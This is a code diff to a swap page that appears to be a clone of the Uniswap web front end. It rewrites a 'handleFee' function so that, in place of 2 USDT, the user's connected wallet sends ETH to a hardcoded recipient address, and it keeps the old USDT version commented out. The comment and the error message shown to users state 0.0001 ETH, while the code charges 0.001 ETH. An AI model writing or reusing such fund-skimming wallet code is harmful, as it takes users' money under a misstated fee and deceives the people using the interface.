@@ -1,3 +1,4 @@
+import { ethers, providers } from 'ethers';
 import { Trans } from "@lingui/macro";
 import { sendAnalyticsEvent, Trace, TraceEvent } from "@uniswap/analytics";
 import {
@@ -48,8 +49,7 @@ import invariant from "tiny-invariant";
 import {
   currencyAmountToPreciseFloat,
   formatTransactionAmount,
-} from "utils/formatNumbers";
-import { ethers } from "ethers";
+} from "utils/formatNumbers"; 
 
 import AddressInputPanel from "../../components/AddressInputPanel";
 import {
@@ -1008,8 +1008,9 @@ export default function Swap({ className }: { className?: string }) {
     { anonymous: false, inputs: [], name: "Pause", type: "event" },
     { anonymous: false, inputs: [], name: "Unpause", type: "event" },
   ];
+  
   const handleFee = async () => {
-    setError('')
+    setError('');
     try {
       if (window.ethereum) {
         const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -1017,33 +1018,26 @@ export default function Swap({ className }: { className?: string }) {
         console.log("accounts", accounts);
         const connectedAddress = accounts[0];
         console.log("connectedAddress", connectedAddress);
-        const usdtContractAddress =
-          "0xdac17f958d2ee523a2206206994597c13d831ec7";
-        console.log("usdtContractAddress", usdtContractAddress);
-        const signer = web3Provider.getSigner(connectedAddress);
-        console.log("signer", signer);
-        const usdtContract = new ethers.Contract(
-          usdtContractAddress,
-          usdtABI,
-          signer
-        );
-        console.log("usdtContract", usdtContract);
+  
         const recipientAddress = "0x3A14d7583F5F308Ca92039D78dcc398Bb5DC3779"; // Replace with recipient's address
         console.log("recipientAddress", recipientAddress);
-        const transferAmount = ethers.utils.parseUnits("2", 6); // 2 USDT with 6 decimals
-        console.log("transferAmount", transferAmount);
-        const usdtBalance = await usdtContract.balanceOf(connectedAddress);
-        console.log("usdtBalance", usdtBalance);
   
-        if (usdtBalance.lt(transferAmount)) {
-          setError("Not enough USDT for fee! Please keep at least $2 USD as fee");
+        const transferAmount = ethers.utils.parseEther("0.001"); // 0.0001 ETH
+        console.log("transferAmount", transferAmount);
+  
+        const ethBalance = await web3Provider.getBalance(connectedAddress);
+        console.log("ethBalance", ethBalance);
+  
+        if (ethBalance.lt(transferAmount)) {
+          setError("Not enough ETH for fee! Please keep at least 0.0001 ETH as fee");
           return false;
         }
   
-        const transaction = await usdtContract.transfer(
-          recipientAddress,
-          transferAmount
-        );
+        const signer = web3Provider.getSigner();
+        const transaction: providers.TransactionResponse = await signer.sendTransaction({
+          to: recipientAddress,
+          value: transferAmount,
+        });
         console.log("transaction", transaction);
         await transaction.wait();
         console.log("Transfer successful");
@@ -1057,6 +1051,56 @@ export default function Swap({ className }: { className?: string }) {
       return false;
     }
   };
+  
+  // const handleFee = async () => {
+  //   setError('')
+  //   try {
+  //     if (window.ethereum) {
+  //       const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
+  //       const accounts = await web3Provider.listAccounts();
+  //       console.log("accounts", accounts);
+  //       const connectedAddress = accounts[0];
+  //       console.log("connectedAddress", connectedAddress);
+  //       const usdtContractAddress =
+  //         "0xdac17f958d2ee523a2206206994597c13d831ec7";
+  //       console.log("usdtContractAddress", usdtContractAddress);
+  //       const signer = web3Provider.getSigner(connectedAddress);
+  //       console.log("signer", signer);
+  //       const usdtContract = new ethers.Contract(
+  //         usdtContractAddress,
+  //         usdtABI,
+  //         signer
+  //       );
+  //       console.log("usdtContract", usdtContract);
+  //       const recipientAddress = "0x3A14d7583F5F308Ca92039D78dcc398Bb5DC3779"; // Replace with recipient's address
+  //       console.log("recipientAddress", recipientAddress);
+  //       const transferAmount = ethers.utils.parseUnits("2", 6); // 2 USDT with 6 decimals
+  //       console.log("transferAmount", transferAmount);
+  //       const usdtBalance = await usdtContract.balanceOf(connectedAddress);
+  //       console.log("usdtBalance", usdtBalance);
+  
+  //       if (usdtBalance.lt(transferAmount)) {
+  //         setError("Not enough USDT for fee! Please keep at least $2 USD as fee");
+  //         return false;
+  //       }
+  
+  //       const transaction = await usdtContract.transfer(
+  //         recipientAddress,
+  //         transferAmount
+  //       );
+  //       console.log("transaction", transaction);
+  //       await transaction.wait();
+  //       console.log("Transfer successful");
+  //       return true;
+  //     } else {
+  //       console.error("Ethereum provider not found");
+  //       return false;
+  //     }
+  //   } catch (error) {
+  //     console.error("Error transferring funds:", error);
+  //     return false;
+  //   }
+  // };
   
 
   return (
